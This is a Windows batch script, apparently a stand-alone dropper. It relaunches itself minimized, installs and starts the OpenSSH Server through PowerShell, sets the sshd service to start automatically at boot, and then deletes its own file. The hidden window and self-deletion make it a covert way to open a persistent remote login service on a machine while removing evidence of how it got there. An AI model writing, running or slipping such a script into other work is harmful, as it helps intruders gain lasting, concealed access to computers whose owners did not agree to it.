@echo off
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
	start /B /wait "" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /c Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
	start /B /wait "" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /c Start-Service sshd
	start /B /wait "" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /c Set-Service sshd -StartupType Automatic
	(goto) 2>nul & del "%~f0"
exit
